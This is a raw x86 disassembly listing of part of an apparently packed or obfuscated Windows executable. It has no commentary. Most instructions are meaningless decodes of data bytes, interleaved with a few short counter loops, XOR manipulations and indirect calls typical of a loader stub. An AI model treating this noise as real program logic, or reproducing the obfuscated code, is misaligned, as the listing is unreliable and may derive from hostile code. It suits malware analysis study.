  40211d:	inc    eax
  40211e:	cwde   
  40211f:	jno    0x4020e5
  402121:	add    bl,bh
  402123:	rcl    DWORD PTR [ebp+0x6a],cl
  402126:	push   0x1e
  402128:	es push 0xffffff94
  40212b:	sbb    DWORD PTR [esp+ebx*4],ebp
  40212e:	jmp    0x4020e0
  402130:	fisub  WORD PTR [ebx]
  402132:	int    0xa8
  402134:	in     al,dx
  402135:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402136:	mov    esp,0xb7b46066
  40213b:	not    cl
  40213d:	cld    
  40213e:	and    DWORD PTR [ebp+edi*8+0x7bd7b32c],edi
  402145:	sub    eax,0x97f3a172
  40214a:	add    esi,ecx
  40214c:	inc    ebx
  40214d:	jle    0x4021a2
  40214f:	test   BYTE PTR [ebp+0x30],al
  402152:	xor    ebp,DWORD PTR [eax-0x17]
  402155:	xor    eax,0x806820d7
  40215a:	dec    ebx
  40215b:	mov    gs,WORD PTR [esi-0x215abe68]
  402161:	cld    
  402162:	idiv   BYTE PTR [edi]
  402164:	(bad)  
  402165:	inc    DWORD PTR [esi-0x35fb2126]
  40216b:	push   ds
  40216c:	ss repz mov ecx,0xafd217be
  402173:	cmp    ebp,DWORD PTR [ecx+0x35b5c585]
  402179:	jge    0x4021ca
  40217b:	loopne 0x402156
  40217d:	leave  
  40217e:	cwde   
  40217f:	es jne 0x40213f
  402182:	shl    BYTE PTR [esi-0x4a7b3b00],0xf1
  402189:	dec    ebx
  40218a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40218b:	sub    al,0xaf
  40218d:	clc    
  40218e:	mov    eax,ecx
  402190:	or     BYTE PTR [ebx-0x222986d6],al
  402196:	out    dx,al
  402197:	jmp    0x6340:0xf6ae4848
  40219e:	test   eax,0x620078bf
  4021a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021a4:	or     DWORD PTR [ebp+ecx*4+0x4],edi
  4021a8:	inc    DWORD PTR [ecx+0x4398be44]
  4021ae:	add    DWORD PTR [ebx-0x1ebfec52],0x5e
  4021b5:	xor    ecx,DWORD PTR [eax]
  4021b7:	iret   
  4021b8:	hlt    
  4021b9:	dec    eax
  4021ba:	jp     0x402140
  4021bc:	lahf   
  4021bd:	dec    esi
  4021be:	and    al,0x65
  4021c0:	cmp    ecx,DWORD PTR [eax+0x66]
  4021c3:	mov    ch,0xa7
  4021c5:	pop    DWORD PTR [ebx+esi*8]
  4021c8:	add    DWORD PTR [ecx+eax*2-0x247a6814],esi
  4021cf:	jge    0x4021cb
  4021d1:	fild   DWORD PTR ds:0x7306a3f7
  4021d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021d8:	mov    ah,0x99
  4021da:	pusha  
  4021db:	scas   al,BYTE PTR es:[edi]
  4021dc:	ins    BYTE PTR es:[edi],dx
  4021dd:	inc    ecx
  4021de:	sub    al,0x7c
  4021e0:	popf   
  4021e1:	pushf  
  4021e2:	(bad)  
  4021e3:	add    DWORD PTR [eax+0x54],esp
  4021e6:	inc    ecx
  4021e7:	out    0x32,eax
  4021e9:	leave  
  4021ea:	jg     0x402204
  4021ec:	into   
  4021ed:	xchg   ecx,eax
  4021ee:	dec    edx
  4021ef:	rcr    DWORD PTR [ebx+0x3c315f89],1
  4021f5:	cmp    eax,0xf589dcad
  4021fa:	xchg   DWORD PTR [di+0x68e7],esp
  4021ff:	test   BYTE PTR [edx],0x3f
  402202:	call   DWORD PTR [eax+0x361d438c]
  402208:	push   esp
  402209:	shl    BYTE PTR [ecx+0x4f9cea04],1
  40220f:	xchg   BYTE PTR [ebp-0x4e29603c],cl
  402215:	cwde   
  402216:	xchg   edi,eax
  402217:	stos   BYTE PTR es:[edi],al
  402218:	stos   DWORD PTR es:[edi],eax
  402219:	ret    0xbfb9
  40221c:	lock xor esi,DWORD PTR [edx]
  40221f:	mov    ebx,0x8774a859
  402224:	and    BYTE PTR [esp+ebp*1],ah
  402227:	jp     0x4021d7
  402229:	adc    DWORD PTR [edi-0x11097f30],esp
  40222f:	sub    cl,BYTE PTR [edi]
  402231:	scas   al,BYTE PTR es:[edi]
  402232:	xor    ecx,DWORD PTR [edi+0x2f]
  402235:	inc    eax
  402236:	pop    edx
  402237:	inc    eax
  402238:	pushf  
  402239:	daa    
  40223a:	out    0x24,al
  40223c:	invd   
  40223e:	mov    esp,0x9e0d6aff
  402243:	jg     0x40225c
  402245:	popf   
  402246:	dec    ebx
  402247:	sub    cl,BYTE PTR ds:0xb88dafa6
  40224d:	or     bl,BYTE PTR [esi]
  40224f:	add    al,0xa9
  402251:	imul   edi,DWORD PTR [ecx+0x48],0xdcea7405
  402258:	push   esp
  402259:	pop    ds
  40225a:	jb     0x4022bc
  40225c:	ficom  DWORD PTR [esi-0x5b]
  40225f:	push   ss
  402260:	loop   0x40229c
  402262:	jmp    0x72fe:0x73ea9e8c
  402269:	mov    ebx,0x7dfcecbe
  40226e:	xchg   BYTE PTR [edx],cl
  402270:	sahf   
  402271:	or     DWORD PTR [edx],0xffffff8b
  402274:	popa   
  402275:	push   ebx
  402276:	popa   
  402277:	inc    edx
  402278:	push   ds
  402279:	or     BYTE PTR [ebx],bl
  40227b:	push   ds
  40227c:	jmp    0xd9c7277b
  402281:	stos   DWORD PTR es:[edi],eax
  402282:	add    esp,DWORD PTR [eax+0x6d853a49]
  402288:	(bad)  
  402289:	stc    
  40228a:	mov    ds:0xefc4930a,al
  40228f:	jno    0x40223e
  402291:	outs   dx,BYTE PTR ds:[esi]
  402292:	loope  0x4022e2
  402294:	and    bl,dl
  402296:	and    eax,DWORD PTR [edx+0x32706e13]
  40229c:	xchg   BYTE PTR [eax+0xfff9e01],bh
  4022a2:	out    0xa0,al
  4022a4:	and    DWORD PTR [eax-0x6b07c71],edi
  4022aa:	inc    ebx
  4022ab:	sbb    eax,0x5d3cf922
  4022b1:	add    BYTE PTR [ebp-0x3b5cfc01],bh
  4022b7:	fwait
  4022b8:	cli    
  4022b9:	stos   BYTE PTR es:[edi],al
  4022ba:	fwait
  4022bb:	rcr    DWORD PTR [edx],cl
  4022bd:	xchg   edx,eax
  4022be:	jns    0x40228d
  4022c0:	cli    
  4022c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022c2:	div    ebp
  4022c4:	mov    cl,0xfb
  4022c6:	mov    BYTE PTR [esi],cl
  4022c8:	adc    eax,0x8151f03e
  4022cd:	and    eax,0x42ecef
  4022d2:	add    BYTE PTR [eax],al
  4022d4:	add    BYTE PTR [eax],al
  4022d6:	mov    edx,DWORD PTR ds:0x42ecef
  4022dc:	inc    edx
  4022dd:	mov    DWORD PTR ds:0x42ecef,edx
  4022e3:	cmp    DWORD PTR ds:0x42ecef,0x28
  4022ea:	jne    0x4022fe
  4022f0:	push   DWORD PTR [ebp-0x18]
  4022f3:	push   0x56d1
  4022f8:	call   DWORD PTR ds:0x42e8bf
  4022fe:	cmp    DWORD PTR ds:0x42ecef,0x19
  402305:	jb     0x4022d6
  40230b:	mov    DWORD PTR ds:0x430341,0x1f
  402315:	cmp    DWORD PTR ds:0x430341,0x0
  40231c:	je     0x402548
  402322:	cmp    DWORD PTR ds:0x430341,0x2c
  402329:	jne    0x40233a
  40232f:	push   0x7b19
  402334:	call   DWORD PTR ds:0x42e8af
  40233a:	xor    edx,edx
  40233c:	xor    edx,DWORD PTR ds:0x430341
  402342:	dec    edx
  402343:	mov    DWORD PTR ds:0x430341,edx
  402349:	jmp    0x402315
  40234e:	adc    eax,edx
  402350:	jmp    0x402548
  402355:	ds je  0x4022d9
  402358:	cdq    
  402359:	mov    cl,0x69
  40235b:	out    0x71,al
  40235d:	sub    al,0x9b
  40235f:	mov    cl,0x3a
  402361:	arpl   WORD PTR [ebp+0x3db97ee],di
  402367:	jle    0x4023e7
  402369:	push   ebp
  40236a:	jg     0x4023ea
  40236c:	jle    0x4023d7
  40236e:	out    dx,al
  40236f:	aas    
  402370:	jb     0x4023be
  402372:	xchg   ecx,eax
  402373:	dec    ecx
  402374:	clc    
  402375:	and    BYTE PTR [edi-0x52],cl
  402378:	adc    al,0x7b
  40237a:	add    eax,0xba985c14
  40237f:	push   0x3a
  402381:	sbb    bl,ch
  402383:	test   DWORD PTR [ebx+0x4e],ebx
  402386:	cld    
  402387:	xor    eax,0x3fbc2ea6
  40238c:	icebp  
  40238d:	test   DWORD PTR [edi],ecx
  40238f:	(bad)  
  402390:	or     ebx,DWORD PTR [edi-0x759be3da]
  402396:	or     eax,0xd4ab4518
  40239b:	ror    DWORD PTR [edi],1
  40239d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40239e:	enter  0x7a0a,0xed
  4023a2:	and    ebx,0x5d
  4023a5:	ret    
  4023a6:	outs   dx,DWORD PTR ds:[esi]
  4023a7:	ss cmp edx,esp
  4023aa:	test   ah,0xf
  4023ad:	data16 mov BYTE PTR [edi+0x107c5697],bl
  4023b4:	shl    dl,cl
  4023b6:	outs   dx,DWORD PTR ds:[esi]
  4023b7:	xor    esi,DWORD PTR [edx+0x477649b2]
  4023bd:	add    al,0xb
  4023bf:	cdq    
  4023c0:	enter  0xed5f,0x0
  4023c4:	xchg   esi,eax
  4023c5:	jg     0x4023cc
  4023c7:	add    edi,DWORD PTR [ecx-0x5cdebb15]
  4023cd:	cmp    esi,esp
  4023cf:	sbb    ebx,DWORD PTR [edx]
  4023d1:	push   ebp
  4023d2:	and    BYTE PTR [ecx],0xc8
  4023d5:	sub    ah,bl
  4023d7:	jl     0x4023b1
  4023d9:	mov    ebx,DWORD PTR [edx-0x4b]
  4023dc:	out    dx,al
  4023dd:	xor    bl,dl
  4023df:	pushf  
  4023e0:	cs jns 0x4023c5
  4023e3:	out    dx,eax
  4023e4:	jmp    0x4023d5
  4023e6:	add    bl,BYTE PTR [edx-0x133e77f8]
  4023ec:	(bad)  
  4023ee:	mov    ebx,?
  4023f0:	or     al,0xe4
  4023f2:	fmul   st,st(5)
  4023f4:	and    dl,BYTE PTR [ecx+eax*4+0x68]
  4023f8:	(bad)  [esp-0x207fae4f]
  4023ff:	les    edx,FWORD PTR [ebx-0x257ac32e]
  402405:	enter  0x3e7a,0x95
  402409:	stos   DWORD PTR es:[edi],eax
  40240a:	jl     0x40239e
  40240c:	jae    0x4023a2
  40240e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40240f:	hlt    
  402410:	sub    al,0x30
  402412:	cld    
  402413:	out    0x80,eax
  402415:	xor    BYTE PTR [edi+0x7f32b87f],ch
  40241b:	jmp    0xaff6:0x3575e6e6
  402422:	sti    
  402423:	push   ds
  402424:	aas    
  402425:	inc    eax
  402426:	lahf   
  402427:	fstp   DWORD PTR es:[eax]
  40242a:	in     eax,0x35
  40242c:	sub    DWORD PTR ss:[ecx+0x70],edx
  402430:	jge    0x4024aa
  402432:	dec    ebx
  402433:	add    BYTE PTR [eax+ebx*2+0x4f],bl
  402437:	call   0x7a6135aa
  40243c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40243d:	or     bh,bh
  40243f:	mov    al,ds:0xaa785229
  402444:	call   FWORD PTR [ecx]
  402446:	out    dx,eax
  402447:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402448:	push   esp
  402449:	mov    eax,0xa59c712
  40244e:	add    eax,0x5e52a6f1
  402453:	sbb    dh,BYTE PTR [eax+0x1]
  402456:	(bad)  
  402457:	repnz dec esi
  402459:	xchg   esp,eax
  40245a:	and    al,0xd5
  40245c:	mov    al,BYTE PTR [edi-0x9ffd81c]
  402462:	sbb    ebp,DWORD PTR [ebp+0x6c424509]
  402468:	mov    dl,0xf6
  40246a:	imul   esp,DWORD PTR [edx],0x2c
  40246d:	ficom  DWORD PTR ds:0x7cd8eae5
  402473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402474:	mov    dl,0xd4
  402476:	jnp    0x40248f
  402478:	sub    eax,0x44e60f70
  40247d:	or     al,al
  40247f:	add    eax,0x7eb0c0ff
  402484:	jge    0x4024bd
  402486:	aaa    
  402487:	mov    ebx,0xa8dbba92
  40248c:	test   DWORD PTR [ebp-0x2a],esi
  40248f:	je     0x4024b5
  402491:	adc    eax,0x4dd7d5a0
  402496:	xchg   esp,eax
  402497:	dec    ebp
  402498:	xchg   edx,eax
  402499:	adc    BYTE PTR [ecx+0x61],al
  40249c:	pushf  
  40249d:	mov    esi,0x2df4711f
  4024a2:	mov    eax,ss
  4024a4:	(bad)  
  4024a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024a7:	addr16 mov bl,0xdc
  4024aa:	pop    ebx
  4024ab:	paddsw mm5,QWORD PTR [eax+ecx*8+0x6a]
  4024b0:	mov    edi,0xd920745c
  4024b5:	inc    esp
  4024b6:	sbb    eax,0x7d12fb4a
  4024bb:	mov    dh,0xe5
  4024bd:	push   cs
  4024be:	push   eax
  4024bf:	ret    0xae53
  4024c2:	ja     0x4024e0
  4024c4:	push   ecx
  4024c5:	cmp    al,0x7e
  4024c7:	jl     0x4024b6
  4024c9:	push   ecx
  4024ca:	add    eax,0xfb54d21d
  4024cf:	test   DWORD PTR [edi+0x20],esi
  4024d2:	lea    ebx,[esi+0x5c]
  4024d5:	(bad)  
  4024d6:	loope  0x40253c
  4024d8:	jge    0x4024e7
  4024da:	pop    esp
  4024db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024dc:	fwait
  4024dd:	int3   
  4024de:	fwait
  4024df:	xor    al,0x25
  4024e1:	mov    bl,0x23
  4024e3:	mov    BYTE PTR [esi+0x36],al
  4024e6:	adc    DWORD PTR [eax],0xfffffff5
  4024e9:	jae    0x4024ae
  4024eb:	jo     0x40253f
  4024ed:	cmp    BYTE PTR [edx+edx*8],0xd3
  4024f1:	jbe    0x4024f4
  4024f3:	mov    ebx,0xd0d01e24
  4024f8:	lea    ecx,[ecx+0x69]
  4024fb:	aaa    
  4024fc:	ss sub eax,0x8f8c7c63
  402502:	jbe    0x402523
  402504:	mov    DWORD PTR [ebx+0x32],eax
  402507:	xchg   esi,eax
  402508:	and    ecx,ebx
  40250a:	fnstsw WORD PTR [edx]
  40250c:	pop    es
  40250d:	sub    BYTE PTR [ecx+0x10],bl
  402510:	dec    ebx
  402511:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402512:	mov    ebx,0x29d0ddc5
  402517:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402518:	popa   
  402519:	fs icebp 
  40251b:	fimul  DWORD PTR [ecx]
  40251d:	cmp    ebx,DWORD PTR [esi+0x1581c2d6]
  402523:	and    DWORD PTR [ebx-0x17],0xdea3ba2c
  40252a:	pusha  
  40252b:	loope  0x4024d2
  40252d:	test   eax,0xab0b3a6a
  402532:	into   
  402533:	test   al,0x72
  402535:	(bad)  
  402537:	stos   BYTE PTR es:[edi],al
  402538:	jle    0x40250e
  40253a:	adc    BYTE PTR [edx*2+0x28bb66cf],ch
  402541:	xchg   esp,eax
  402542:	into   
  402543:	mov    ebp,0xacd602c
  402548:	push   ecx
  402549:	and    DWORD PTR ds:0x42eccb,0x3339
  402553:	mov    eax,0xf89c8531
  402558:	movzx  edx,WORD PTR ds:0x42ecf3
  40255f:	xor    edx,DWORD PTR ds:0x42eccf
  402565:	mov    DWORD PTR ds:0x42ecf3,edx
  40256b:	mov    DWORD PTR [ebp-0x8],eax
  40256e:	xor    ecx,ecx
  402570:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  402577:	mov    edx,DWORD PTR [ebp-0x8]
  40257a:	add    DWORD PTR ds:0x430365,0x1aee
  402584:	push   esi
  402585:	mov    ecx,0x7510854
  40258a:	xor    esi,esi
  40258c:	or     esi,DWORD PTR ds:0x430345
  402592:	and    DWORD PTR ds:0x42ecd7,esi
  402598:	xor    edx,ecx
  40259a:	and    DWORD PTR ds:0x4303cf,0x0
  4025a4:	jmp    0x4025b8
  4025a9:	xor    esi,esi
  4025ab:	xor    esi,DWORD PTR ds:0x4303cf
  4025b1:	inc    esi
  4025b2:	mov    DWORD PTR ds:0x4303cf,esi
  4025b8:	cmp    DWORD PTR ds:0x4303cf,0x10
  4025bf:	jae    0x4025fc
  4025c5:	cmp    DWORD PTR ds:0x4303cf,0x9
  4025cc:	jne    0x4025dd
  4025d2:	push   0x42e746
  4025d7:	call   DWORD PTR ds:0x42e8c3
  4025dd:	cmp    DWORD PTR ds:0x4303cf,0x8
  4025e4:	jne    0x4025f7
  4025ea:	mov    esi,DWORD PTR ds:0x4303cf
  4025f0:	inc    esi
  4025f1:	mov    DWORD PTR ds:0x4303cf,esi
  4025f7:	jmp    0x4025a9
  4025fc:	mov    esi,0x32729b
  402601:	jmp    0x4027f9
  402606:	lock and ch,BYTE PTR [esi+eax*1-0xf8f6f94]
  40260e:	xchg   edi,eax
  40260f:	aaa    
  402610:	ins    DWORD PTR es:[edi],dx
  402611:	fs dec ebx
  402613:	stc    
  402614:	and    dh,bh
  402616:	add    DWORD PTR ds:[esi+0x7e],edi
  40261a:	push   ebp
  40261b:	jg     0x40269b
  40261d:	jle    0x40268b
  40261f:	fwait
  402620:	jmp    0xa0135a4d
  402625:	lahf   
  402626:	mov    esi,0xf9bbaeb5
  40262b:	push   ebx
  40262c:	rcr    BYTE PTR [eax+edx*4],0x19
  402630:	push   es
  402631:	icebp  
  402632:	(bad)
  402635:	lahf   
  402636:	adc    DWORD PTR [edx],eax
  402638:	mov    WORD PTR [edi+0x7ae6dfbf],?
  40263e:	mov    DWORD PTR [esi+0x3d1c1dcd],ebx
  402644:	sub    DWORD PTR [edi+0xcfd8beb],edi
  40264a:	dec    ecx
  40264b:	test   eax,0xbbdf8e3
  402650:	mov    dh,0x89
  402652:	mov    es,WORD PTR [ebx+ecx*1]
  402655:	icebp  
  402656:	push   ss
  402657:	out    dx,al
  402658:	mov    DWORD PTR [ecx],edi
  40265a:	cli    
  40265b:	mov    ecx,0x871c212d
  402660:	fdivr  st,st(3)
  402662:	(bad)  [esi-0x77cff054]
  402668:	std    
  402669:	cmp    DWORD PTR [edx-0x28bac387],edi
  40266f:	sbb    eax,0x8582c9f4
  402674:	aaa    
  402675:	aas    
  402676:	popf   
  402677:	mov    ecx,0x56e019ae
  40267c:	jbe    0x4026a3
  40267e:	nop
  40267f:	shr    BYTE PTR [ebx-0x31feed22],0xa7
  402686:	sbb    eax,0xceac7df1
  40268b:	nop
  40268c:	mov    ds:0x517792db,al
  402691:	into   
  402692:	xor    bl,dh
  402694:	mov    bh,0x91
  402696:	jg     0x4026cd
  402698:	xor    BYTE PTR [edi+eiz*4],bl
  40269b:	(bad)  
  40269c:	jmp    0xd88e:0x7a68326c
  4026a3:	inc    eax
  4026a4:	retf   
  4026a5:	enter  0x2a51,0xda
  4026a9:	or     BYTE PTR [ebx-0x7fef0df1],dl
  4026af:	into   
  4026b0:	mov    al,0x9
  4026b2:	aad    0xe8
  4026b4:	outs   dx,DWORD PTR ds:[esi]
  4026b5:	xor    BYTE PTR [edi+0x6e5f1576],dl
  4026bb:	pop    esp
  4026bc:	jge    0x402686
  4026be:	mov    ds:0xd55087e2,eax
  4026c3:	das    
  4026c4:	(bad)  
  4026c5:	and    al,BYTE PTR [ecx+0x53]
  4026c8:	jns    0x402715
  4026ca:	pop    edi
  4026cb:	jnp    0x40274b
  4026cd:	mov    edx,0xcccf13b6
  4026d2:	outs   dx,DWORD PTR ds:[esi]
  4026d3:	adc    eax,0xbc98fef1
  4026d8:	bound  esi,QWORD PTR [edi+0x60dbbcb1]
  4026de:	xor    cl,BYTE PTR [ecx]
  4026e0:	cmp    al,0x94
  4026e2:	add    al,0x14
  4026e4:	outs   dx,DWORD PTR ds:[esi]
  4026e5:	mov    ecx,0x9ade1f21
  4026ea:	push   ebx
  4026eb:	(bad)  
  4026ec:	out    dx,al
  4026ed:	lds    eax,FWORD PTR [eax]
  4026ef:	mov    bh,0x5c
  4026f1:	sub    BYTE PTR [edx],ch
  4026f3:	push   0xc2088817
  4026f8:	cmp    esi,DWORD PTR [ebx]
  4026fa:	idiv   BYTE PTR [edx-0x80]
  4026fd:	outs   dx,DWORD PTR ds:[esi]
  4026fe:	scas   al,BYTE PTR es:[edi]
  4026ff:	cmp    ah,bl
  402701:	jo     0x4026f3
  402703:	out    dx,al
  402704:	jmp    0xf7dd:0x3c73fc14
  40270b:	lahf   
  40270c:	pop    esp
  40270d:	popf   
  40270e:	push   edi
  40270f:	xor    BYTE PTR [ebx],dh
  402711:	push   0xffffffe6
  402713:	out    0x1d,eax
  402715:	inc    ecx
  402716:	push   ebx
  402717:	or     ch,BYTE PTR [edi-0x9]
  40271a:	lahf   
  40271b:	(bad)  
  40271c:	sbb    DWORD PTR [eax],ecx
  40271e:	js     0x402713
  402720:	mov    ecx,?
  402722:	shl    al,0x6f
  402725:	icebp  
  402726:	mov    al,0x1c
  402728:	sti    
  402729:	out    0xe7,al
  40272b:	or     BYTE PTR [eax+0x66eaa821],dl
  402731:	and    DWORD PTR [esi-0x7a],edi
  402734:	pop    ebx
  402735:	push   dx
  402737:	adc    cl,al
  402739:	int    0xec
  40273b:	rcr    DWORD PTR [edx+0x130fc83a],0x48
  402742:	call   0x7e4c:0x65a2dc97
  402749:	dec    eax
  40274a:	or     al,0x1c
  40274c:	mov    DWORD PTR [ecx+0x5],edx
  40274f:	jae    0x4026e3
  402751:	inc    ebp
  402752:	call   0x1461:0x96ba6772
  402759:	fadd   QWORD PTR [ecx-0x63849ffd]
  40275f:	adc    ecx,DWORD PTR [esi-0xb]
  402762:	int3   
  402763:	in     eax,dx
  402764:	sub    eax,0x214e31f
  402769:	pop    esi
  40276a:	inc    esp
  40276b:	sahf   
  40276c:	arpl   bp,dx
  40276e:	mov    dl,BYTE PTR [edi]
  402770:	pushf  
  402771:	add    al,0x5b
  402773:	cli    
  402774:	ds je  0x40277b
  402777:	ins    DWORD PTR es:[edi],dx
  402778:	sub    DWORD PTR [esi+0x1f],edi
  40277b:	in     al,0x80
  40277d:	mov    dh,0x64
  40277f:	adc    DWORD PTR [edx+ecx*4-0x3b59d768],esp
  402786:	pop    edi
  402787:	lds    ebp,FWORD PTR [edi+0x10]
  40278a:	push   edx
  40278b:	dec    eax
  40278c:	mov    ch,BYTE PTR [edx+0x3fdc4b3b]
  402792:	int3   
  402793:	mov    ecx,0x9494cc34
  402798:	mov    ebp,edi
  40279a:	(bad)  
  40279b:	xchg   esp,eax
  40279c:	push   eax
  40279d:	mov    al,0x3b
  40279f:	in     al,dx
  4027a0:	pop    es
  4027a1:	push   ebx
  4027a2:	push   ss
  4027a3:	xlat   BYTE PTR ds:[ebx]
  4027a4:	add    al,BYTE PTR [ecx+eax*4-0x49]
  4027a8:	xchg   esp,eax
  4027a9:	fnstsw WORD PTR [edi+0x445bedca]
  4027af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027b0:	sub    BYTE PTR [ecx],ah
  4027b2:	or     dh,BYTE PTR [esi-0x661b8f9c]
  4027b8:	mov    ah,0x77
  4027ba:	jecxz  0x402837
  4027bc:	(bad)  
  4027bd:	loop   0x40274d
  4027bf:	xchg   ecx,eax
  4027c0:	jbe    0x4027d7
  4027c2:	mov    edx,DWORD PTR [edx-0x7e]
  4027c5:	push   ebx
  4027c6:	leave  
  4027c7:	inc    esp
  4027c8:	and    BYTE PTR [eax-0x5e28795e],ah
  4027ce:	fild   DWORD PTR [esi-0x27]
  4027d1:	inc    ecx
  4027d2:	sub    eax,0x4b43700e
  4027d7:	dec    ebx
  4027d8:	jne    0x402769
  4027da:	sub    BYTE PTR [edi+0x4a],cl
  4027dd:	adc    ch,bl
  4027df:	sti    
  4027e0:	ds mov ah,0x42
  4027e3:	nop
  4027e4:	aas    
  4027e5:	push   eax
  4027e6:	dec    ebp
  4027e7:	add    bh,BYTE PTR [edx+0x4e]
  4027ea:	aad    0x6f
  4027ec:	icebp  
  4027ed:	mov    esp,0xf8d1d123
  4027f2:	out    0xbe,eax
  4027f4:	or     DWORD PTR [ebp-0x52],0x8b577f8b
  4027fb:	jge    0x40280d
  4027fd:	add    edx,esi
  4027ff:	cmp    edi,edx
  402801:	je     0x402e62
  402807:	mov    edx,DWORD PTR [ebp-0x8]
  40280a:	mov    eax,DWORD PTR [ebp-0x4]
  40280d:	xor    eax,ecx
  40280f:	mov    edi,0xffcd8d65
  402814:	sub    edi,eax
  402816:	jmp    0x402a0e
  40281b:	ins    BYTE PTR es:[edi],dx
  40281c:	cmp    al,0x55
  40281e:	arpl   WORD PTR [ebp+0x73],si
  402821:	push   0x2ad4f5d1
  402826:	xor    DWORD PTR [edi+eiz*4+0xf15a74a],ecx
  40282d:	jle    0x4028ad
  40282f:	push   ebp
  402830:	jg     0x4028b0
  402832:	jle    0x402837
  402834:	in     al,dx
  402835:	aam    0xe3
  402837:	or     dh,BYTE PTR [esi-0x7eab4d1f]
  40283d:	jp     0x402851
  40283f:	shr    DWORD PTR gs:[eax+0x24],1
  402843:	js     0x40281d
  402845:	rcl    BYTE PTR [edx+esi*2-0x5796c1b3],cl
  40284c:	or     BYTE PTR [edx-0x37],dh
  40284f:	pushf  
  402850:	inc    esp
  402851:	cmp    edi,0x6b2176bd
  402857:	cmp    eax,0x6557dfc8
  40285c:	adc    DWORD PTR [edi+ebp*8],ecx
  40285f:	cdq    
  402860:	push   ds
  402861:	jo     0x40281a
  402863:	push   ss
  402864:	inc    ebp
  402865:	dec    dh
  402867:	and    dl,bl
  402869:	test   eax,0x1727871d
  40286e:	push   edx
  40286f:	mov    esi,0x2f787b31
  402874:	sbb    ch,BYTE PTR [ebp-0x717838e5]
  40287a:	cmp    BYTE PTR [ecx+edi*2],cl
  40287d:	scas   al,BYTE PTR es:[edi]
  40287e:	or     eax,0x9c4f35c1
  402883:	dec    edx
  402884:	cdq    
  402885:	mov    esp,0x580cd5b1
  40288a:	mov    ebp,DWORD PTR [esi+0x1d026194]
  402890:	inc    ecx
  402891:	jae    0x402909
  402893:	mov    ecx,0xbbbe755c
  402898:	sub    edi,DWORD PTR [esi-0x5e]
  40289b:	xchg   DWORD PTR [eax],esi
  40289d:	add    BYTE PTR [ecx+edi*8+0x77],ch
  4028a1:	sub    dl,dl
  4028a3:	and    al,0xc3
  4028a5:	je     0x402923
  4028a7:	and    eax,0xaa6f43cc
  4028ac:	cdq    
  4028ad:	pop    ebx
  4028ae:	in     al,0x8e
  4028b0:	loop   0x402917
  4028b2:	mov    ecx,0xf44dd072
  4028b7:	pop    eax
  4028b8:	bound  esp,QWORD PTR [edx]
  4028ba:	push   esi
  4028bb:	sub    DWORD PTR [esi-0x431cdad3],0xffffffd9
  4028c2:	xor    ecx,edx
  4028c4:	or     DWORD PTR [edx],edi
  4028c6:	data16 daa 
  4028c8:	sbb    cl,BYTE PTR [esi]
  4028ca:	pop    ss
  4028cb:	adc    al,0x21
  4028cd:	pop    esi
  4028ce:	mov    bl,0xe3
  4028d0:	in     eax,0x8
  4028d2:	(bad)  
  4028d3:	adc    al,0x85
  4028d5:	gs xchg ebx,eax
  4028d7:	jne    0x40292b
  4028d9:	test   BYTE PTR [eax],ah
  4028db:	in     eax,0xe2
  4028dd:	adc    ecx,DWORD PTR [eax+0x3485cbb3]
  4028e3:	cmp    esp,esi
  4028e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028e6:	mov    ebx,0xdae16a3c
  4028eb:	adc    al,0x2
  4028ed:	jp     0x402896
  4028ef:	dec    esp
  4028f0:	mov    ebp,0x7e45b7da
  4028f5:	xor    al,0x98
  4028f7:	pop    ds
  4028f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028f9:	mov    bh,0xa1
  4028fb:	cwde   
  4028fc:	ficom  DWORD PTR [ecx+0x59]
  4028ff:	stos   DWORD PTR es:[edi],eax
  402900:	pop    ecx
  402901:	jb     0x40293b
  402903:	push   esp
  402904:	pop    edi
  402905:	pop    edi
  402906:	ja     0x402965
  402908:	inc    eax
  402909:	sub    eax,0x796537d2
  40290e:	dec    ebx
  40290f:	mov    esi,0x84761566
  402914:	jbe    0x40290d
  402916:	or     al,0x88
  402918:	and    al,0xd4
  40291a:	mov    edx,0xb09d619c
  40291f:	jno    0x402916
  402921:	adc    BYTE PTR [edi+ecx*4],ah
  402924:	pop    esi
  402925:	(bad)  
  402926:	lock cdq 
  402928:	xor    eax,0x50cb79f8
  40292d:	aam    0x9b
  40292f:	pop    edx
  402930:	inc    edi
  402931:	add    ebp,edx
  402933:	lods   eax,DWORD PTR ds:[esi]
  402934:	pop    ebx
  402935:	mov    edx,0x7e25651e
  40293a:	imul   edi,DWORD PTR [ebp+0x6c6d1ba9],0x7bce2d5a
  402944:	aas    
  402945:	jnp    0x4029b2
  402947:	jle    0x4028d5
  402949:	push   0x41
  40294b:	out    0x11,al
  40294d:	loop   0x402993
  40294f:	fwait
  402950:	xchg   DWORD PTR [ecx+0x1e],ebp
  402953:	ret    
  402954:	push   es
  402955:	xchg   edi,eax
  402956:	push   ebp
  402957:	loopne 0x40297d
  402959:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40295a:	test   DWORD PTR [ebx+0x744dcbcb],ebp
  402960:	cli    
  402961:	call   0x48b6:0x16fa178c
  402968:	cwde   
  402969:	push   edx
  40296a:	pop    ds
  40296b:	test   BYTE PTR [ebp-0x6],cl
  40296e:	mov    ecx,0xcb65b1c1
  402973:	call   0xed43:0x9870cf36
  40297a:	shr    DWORD PTR [ebx+0xc],1
  40297d:	mov    ebp,0x8271911
  402982:	sbb    eax,0x61ee68e
  402987:	mov    ebx,0x16b9befe
  40298c:	ins    BYTE PTR es:[edi],dx
  40298d:	mov    eax,ds:0x19142a8
